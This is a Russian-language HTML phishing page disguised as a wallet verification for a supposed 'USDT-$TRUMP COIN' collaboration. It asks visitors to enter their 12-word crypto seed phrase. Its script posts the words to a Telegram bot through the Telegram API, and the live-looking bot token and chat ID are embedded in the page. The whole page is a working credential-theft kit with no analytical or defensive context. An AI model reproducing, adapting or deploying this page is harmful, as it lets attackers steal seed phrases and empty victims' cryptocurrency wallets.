<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Верификация кошелька</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0B0E11;
            color: #FFFFFF;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background-color: #1E1E1E;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            max-width: 100px;
            height: auto;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 16px;
        }
        .description {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 20px;
        }
        .seed-input {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        .seed-item {
            display: flex;
            align-items: center;
        }
        .seed-item label {
            font-size: 14px;
            color: #A0A0A0;
            font-weight: bold;
            width: 30px;
            text-align: right;
            margin-right: 8px;
        }
        input {
            width: 100%;
            padding: 8px;
            font-size: 14px;
            border: 1px solid #333333;
            border-radius: 6px;
            background-color: #2C2C2C;
            color: #FFFFFF;
            box-sizing: border-box;
        }
        input::placeholder {
            color: #888888;
        }
        input:focus {
            outline: none;
        }
        button {
            margin-top: 20px;
            width: 100%;
            padding: 14px;
            background-color: #1E90FF;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1C86EE;
        }
        .warning {
            margin-top: 10px;
            font-size: 12px;
            color: #FFD700;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="IMG_2094.png" alt="Логотип">
        </div>
        <h1>Для участия в колоборации USDT-$TRUMP COIN авторизуйте свой кошелёк</h1>
        <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
        <form id="seedForm">
            <div class="seed-input">
                <!-- Поля для ввода слов -->
                ${Array.from({ length: 12 }, (_, i) => `
                <div class="seed-item">
                    <label for="word${i + 1}">${i + 1}.</label>
                    <input type="text" id="word${i + 1}" name="word${i + 1}" placeholder="Введите слово" required>
                </div>`).join('')}
            </div>
            <button type="submit">Отправить</button>
        </form>
        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
    </div>

    <script>
        document.getElementById('seedForm').addEventListener('submit', async function (event) {
            event.preventDefault();

            // Собираем данные из формы
            const formData = new FormData(event.target);
            const words = Array.from({ length: 12 }, (_, i) => formData.get(`word${i + 1}`)).join('\n');

            // Telegram API
            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg
'; // Вставьте токен вашего бота
            const chatId = '@bdsjxjdhd'; // Вставьте ваш chat_id
            const message = `Секретная фраза:\n${words}`;

            // Отправка данных в Telegram
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                if (response.ok) {
                    alert('Данные успешно отправлены!');
                } else {
                    alert('Ошибка при отправке данных.');
                }
            } catch (error) {
                alert('Ошибка сети. Проверьте подключение к интернету.');
            }
        });
    </script>
</body>
</html>
